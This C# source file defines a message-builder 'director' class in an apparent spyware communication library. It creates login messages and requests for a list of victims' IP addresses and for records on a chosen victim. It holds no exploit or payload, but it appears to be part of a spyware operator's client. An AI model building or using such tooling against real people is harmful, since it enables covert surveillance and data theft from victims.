
using SpyCommunicationLib.Builders;

namespace SpyCommunicationLib.Directors
{
    /// <summary>
    /// Director for building user-related spy messages with token authorization.
    /// </summary>
    public class UserMessageDirector
    {
        private UserMessageBuilder _builder;

        /// <summary>
        /// Initializes a new instance of the <see cref="UserMessageDirector"/> class.
        /// </summary>
        public UserMessageDirector()
        {
            _builder = new UserMessageBuilder();
        }

        /// <summary>
        /// Creates a login message with given username and password.
        /// </summary>
        /// <param name="username">User login name.</param>
        /// <param name="password">User password.</param>
        /// <returns>Configured SpyMessage for login.</returns>
        public SpyMessage GetLogginMessage(string username, string password)
        {
            _builder.SetAction(MessageAction.Login);
            _builder.SetOption("username", username);
            _builder.SetOption("password", password);
            return _builder.GetMessage();
        }

        /// <summary>
        /// Creates a message requesting the list of victims' IP addresses.
        /// </summary>
        /// <returns>SpyMessage to request victims IP list.</returns>
        public SpyMessage GetVictimsIpListMessage()
        {
            _builder.SetAction(MessageAction.GetVictimsIpList);
            return _builder.GetMessage();
        }

        /// <summary>
        /// Creates a message requesting records of a specified victim.
        /// </summary>
        /// <param name="victim_id">Identifier of the victim.</param>
        /// <returns>SpyMessage to get victim records.</returns>
        public SpyMessage GetVictimRecordsMessage(string victim_ip)
        {
            _builder.SetAction(MessageAction.GetVictimRecords);
            _builder.SetOption("victim_ip", victim_ip);
            return _builder.GetMessage();
        }
    }
}
